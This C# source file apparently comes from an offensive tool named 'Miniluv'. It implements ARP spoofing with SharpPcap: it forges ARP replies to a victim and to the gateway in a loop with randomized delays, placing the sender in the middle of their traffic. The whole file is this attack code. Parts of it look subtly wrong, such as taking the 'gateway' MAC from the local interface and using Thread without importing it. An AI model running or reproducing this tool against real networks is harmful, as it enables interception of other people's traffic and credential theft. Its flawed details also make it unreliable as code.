using Assimilation;
using PacketDotNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using SharpPcap;

namespace Miniluv
{
    public class ArpSpoofing
    {
        private stDeviceInfo m_stDeviceInfo;

        public bool m_bSendARP { get; set; }
        public bool m_bRandomInterval { get; set; }
        public uint m_uMinInterval { get; set; }
        public uint m_uMaxInterval { get; set; }
        public uint m_uInterval { get; set; }

        public ArpSpoofing(stDeviceInfo deviceInfo)
        {
            m_stDeviceInfo = deviceInfo;
            m_bSendARP = true;

            m_bRandomInterval = true;
            m_uMinInterval = 5000;
            m_uMaxInterval = 10000;
            m_uInterval = 5000;
        }

        private Packet MakeMalARPPacket(string szVictimIP, string szSpoofedIP, PhysicalAddress attackerMAC, PhysicalAddress victimMAC)
        {
            EthernetPacket pktEth = new EthernetPacket(attackerMAC, victimMAC, EthernetType.Arp);
            ArpPacket pktARP = new ArpPacket(ArpOperation.Response, victimMAC, IPAddress.Parse(szVictimIP), attackerMAC, IPAddress.Parse(szSpoofedIP));

            pktEth.PayloadPacket = pktARP;

            return pktEth;
        }

        public void SendArpSpoof(string szTargetIP, string szTargetMAC)
        {
            PhysicalAddress myMAC = m_stDeviceInfo.device.MacAddress;
            PhysicalAddress victimMAC = PhysicalAddress.Parse(szTargetMAC);
            PhysicalAddress gatewayMAC = m_stDeviceInfo.networkInterface.GetPhysicalAddress();

            string szGatewayIPv4 = m_stDeviceInfo.GatewayAddress.ToString();
            var device = m_stDeviceInfo.device;

            Random random = new Random();

            while (m_bSendARP)
            {
                Packet pktVictim = MakeMalARPPacket(szTargetIP, szGatewayIPv4, myMAC, victimMAC);
                Packet pktGateway = MakeMalARPPacket(szGatewayIPv4, szTargetIP, myMAC, gatewayMAC);

                device.SendPacket(pktVictim);
                device.SendPacket(pktGateway);

                if (m_bRandomInterval)
                {
                    int delay = random.Next((int)m_uMinInterval, (int)m_uMaxInterval);
                    Thread.Sleep(delay);
                }
                else
                {
                    Thread.Sleep((int)m_uInterval);
                }
            }
        }

        public void Stop()
        {
            m_bSendARP = false;
        }
    }
}
